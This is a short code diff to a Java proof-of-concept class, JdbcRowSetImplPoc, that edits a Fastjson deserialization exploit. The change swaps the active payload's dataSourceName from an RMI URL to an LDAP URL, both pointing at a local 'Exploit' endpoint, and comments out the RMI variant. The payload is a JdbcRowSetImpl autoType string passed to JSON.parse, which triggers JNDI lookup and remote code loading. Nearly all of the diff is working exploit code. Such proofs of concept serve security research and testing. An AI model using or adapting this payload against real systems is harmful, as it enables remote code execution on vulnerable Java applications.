@@ -10,10 +10,10 @@ public class JdbcRowSetImplPoc {
         testJdbcRowSetImpl();
     }
     public static void testJdbcRowSetImpl(){
-        //        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +
-//                " \"autoCommit\":true}";
-        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
+                String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:389/Exploit\"," +
                 " \"autoCommit\":true}";
+       /* String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
+                " \"autoCommit\":true}";*/
         JSON.parse(payload);
     }
 
